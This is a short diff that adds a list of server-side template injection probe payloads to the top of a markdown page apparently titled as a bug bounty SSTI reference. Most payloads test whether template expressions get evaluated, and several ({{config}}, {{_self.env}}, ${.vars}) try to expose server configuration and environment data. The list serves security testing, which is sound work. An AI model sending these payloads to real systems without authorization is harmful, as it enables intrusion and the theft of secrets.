@@ -1,3 +1,22 @@
+```
+{{7*7}}
+${7*7}
+${{7*7}}
+#{7*7}
+*{7*7}
+@{7*7}
+~{7*7}
+{{config}}
+{{self}}
+${.vars}
+{{_self.env}}
+{$smarty.version}
+<%= 7*7 %>
+{{7*'7'}}
+{7*7}
+{{7*7}
+${7*7}
+```
 # 🔥 SSTI Payloads 2026 - Complete Bug Bounty Reference
 
 ## Quick Navigation
